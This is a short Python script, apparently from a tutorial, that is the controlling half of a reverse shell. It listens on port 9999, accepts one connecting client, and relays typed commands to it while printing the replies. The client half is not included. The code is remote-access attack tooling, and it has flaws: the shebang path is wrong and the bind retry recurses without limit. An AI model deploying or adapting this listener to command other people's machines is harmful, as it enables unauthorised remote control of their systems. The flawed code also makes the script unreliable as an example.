#!/usr/env python
import socket, sys

#Create a Socket(connect two computers)
def create_socket():
    
    try:
        global host, port, s

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("[x] Error creating sockets: {0}".format(str(msg)))

#Binding the socket and listening for connections
def bind_socket():

    try:
        global host, port, s

        print("Binding the port {0}".format(str(port)))

        s.bind((host, port)) #bind function takes a tuple as parameters (host and port)
        s.listen(5) #continuously listen for new connections

    except socket.error as msg:
        print("[x] Error creating sockets: {0}\n Retrying...".format(str(msg)))
        bind_socket()

#Establish connection with a client (socket must be listening)
def socket_accept():
    
    conn, address = s.accept()
    print("Connection has been established! | IP: {0} Port: {1}".format(address[0], address[1]))
    
    send_commands(conn)
    
    conn.close()

#send commands to client
def send_commands(conn):
    
    while True:
        
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        
        if len(str.encode(cmd)) > 0: #encodes the string and check that it isn't empty
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8") # receive and convert bytes to string    
            print(client_response, end="")

if __name__ == '__main__':

    create_socket()
    bind_socket()
    socket_accept()
